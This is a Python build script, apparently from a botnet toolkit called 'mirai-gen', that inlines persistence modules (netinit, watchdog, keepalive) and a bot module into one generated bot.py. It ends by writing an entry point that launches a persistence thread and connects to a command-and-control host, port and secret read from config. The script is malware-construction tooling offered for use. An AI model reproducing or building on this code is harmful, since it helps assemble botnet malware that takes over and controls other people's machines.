# builder.py — assembles out/bot.py from parts.
# reads persist modules + bot.py, inlines them into one file.

import os
import json


_HERE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(_HERE)
_OUT = os.path.join(_ROOT, "out")


def _read(path):
    with open(path, "r", encoding="utf-8") as f:
        return f.read()


def _strip_imports(src):
    # drop internal from-imports so we can inline
    lines = []
    for line in src.splitlines():
        s = line.strip()
        if s.startswith("from . import") or s.startswith("from src"):
            continue
        if s.startswith("from ."):
            continue
        lines.append(line)
    return "\n".join(lines)


def build(cfg):
    os.makedirs(_OUT, exist_ok=True)

    parts = []
    parts.append("# generated by mirai-gen builder — do not edit\n")

    parts.append("# --- persist/netinit ---\n")
    parts.append(_strip_imports(_read(os.path.join(_HERE, "persist", "netinit.py"))))

    parts.append("\n\n# --- persist/watchdog ---\n")
    wd = _strip_imports(_read(os.path.join(_HERE, "persist", "watchdog.py")))
    wd = wd.replace("from . import netinit", "# netinit inlined above")
    parts.append(wd)

    parts.append("\n\n# --- persist/keepalive ---\n")
    ka = _strip_imports(_read(os.path.join(_HERE, "persist", "keepalive.py")))
    ka = ka.replace("from . import netinit, watchdog", "# inlined above")
    parts.append(ka)

    parts.append("\n\n# --- bot ---\n")
    parts.append(_strip_imports(_read(os.path.join(_HERE, "bot.py"))))

    parts.append(f"""

# --- entry ---
if __name__ == "__main__":
    import threading
    threading.Thread(target=start, daemon=True).start()
    run({cfg['c2']['host']!r}, {cfg['c2']['port']}, {cfg['c2']['secret']!r})
""")

    out_path = os.path.join(_OUT, "bot.py")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write("".join(parts))
    return out_path
